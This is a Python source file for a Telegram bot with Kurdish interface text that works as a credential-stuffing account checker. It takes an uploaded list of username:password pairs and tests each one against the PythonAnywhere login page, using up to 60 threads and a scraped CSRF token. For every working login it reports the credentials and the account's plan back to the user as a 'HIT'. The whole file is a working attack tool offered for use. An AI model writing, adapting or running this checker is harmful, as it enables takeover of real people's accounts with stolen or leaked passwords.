import asyncio
import requests
from bs4 import BeautifulSoup
from concurrent.futures import ThreadPoolExecutor
from telegram import Update
from telegram.ext import (
    ApplicationBuilder,
    CommandHandler,
    MessageHandler,
    ContextTypes,
    filters
)
import os

# ---------------- CONFIG ----------------
BOT_TOKEN = os.getenv("TOKEN")  # توکن لە Railway Variables وەرگرە
LOGIN_URL = "https://www.pythonanywhere.com/login/"
MAX_THREADS = 60

headers = {
    "User-Agent": "Mozilla/5.0",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
}

executor = ThreadPoolExecutor(max_workers=MAX_THREADS)

# ---------------- CORE CHECK ----------------
def check_account(username, password):
    try:
        session = requests.Session()
        account_url = f"https://www.pythonanywhere.com/user/{username}/account/"

        r_get = session.get(LOGIN_URL, headers=headers, timeout=15)
        soup = BeautifulSoup(r_get.text, "html.parser")
        csrf = soup.find("input", {"name": "csrfmiddlewaretoken"})["value"]

        payload = {
            "csrfmiddlewaretoken": csrf,
            "auth-username": username,
            "auth-password": password,
            "login_view-current_step": "auth",
        }

        r_post = session.post(
            LOGIN_URL,
            data=payload,
            headers={**headers, "Referer": LOGIN_URL},
            allow_redirects=False,
            timeout=15
        )

        if r_post.status_code != 302:
            return "BAD", None

        r_account = session.get(account_url, headers=headers, timeout=15)
        soup = BeautifulSoup(r_account.text, "html.parser")

        plan_ul = soup.find("ul", class_="current_plan")
        if not plan_ul:
            return "BAD", None

        classes = plan_ul.get("class", [])
        plan_name = next(
            (c for c in classes if c not in ["col-md-9", "current_plan"]),
            "Unknown"
        )

        return "HIT", plan_name

    except:
        return "BAD", None

# ---------------- BOT ----------------
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        "👋 سلاو!\n\n"
        "📂 تکایە فایلی accounts.txt بنێرە\n"
        "📌 فۆرمات:\n"
        "username:password"
    )

async def handle_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
    doc = update.message.document
    if not doc.file_name.endswith(".txt"):
        await update.message.reply_text("❌ تکایە تەنها فایل txt بنێرە")
        return

    file = await doc.get_file()
    content = (await file.download_as_bytearray()).decode("utf-8", errors="ignore")

    accounts = []
    for line in content.splitlines():
        if ":" in line:
            u, p = line.strip().split(":", 1)
            accounts.append((u.strip(), p.strip()))

    if not accounts:
        await update.message.reply_text("❌ هیچ ئەکاونتێک نەدۆزرایەوە")
        return

    hit = 0
    bad = 0

    status_msg = await update.message.reply_text(
        f"🚀 Start Checking...\n\n"
        f"✅ Hit :- {hit}\n"
        f"❌ Bad :- {bad}"
    )

    loop = asyncio.get_running_loop()

    for username, password in accounts:
        result, plan = await loop.run_in_executor(
            executor, check_account, username, password
        )

        if result == "HIT":
            hit += 1
            await update.message.reply_text(
                f"✅ HIT\n"
                f"{username}:{password}\n"
                f"Plan: {plan}"
            )
        else:
            bad += 1

        await status_msg.edit_text(
            f"🚀 Checking...\n\n"
            f"✅ Hit :- {hit}\n"
            f"❌ Bad :- {bad}"
        )

    await update.message.reply_text("🏁 Done!")

# ---------------- RUN ----------------
def main():
    app = ApplicationBuilder().token(BOT_TOKEN).build()

    app.add_handler(CommandHandler("start", start))
    app.add_handler(MessageHandler(filters.Document.ALL, handle_file))

    app.run_polling()

if __name__ == "__main__":
    main()
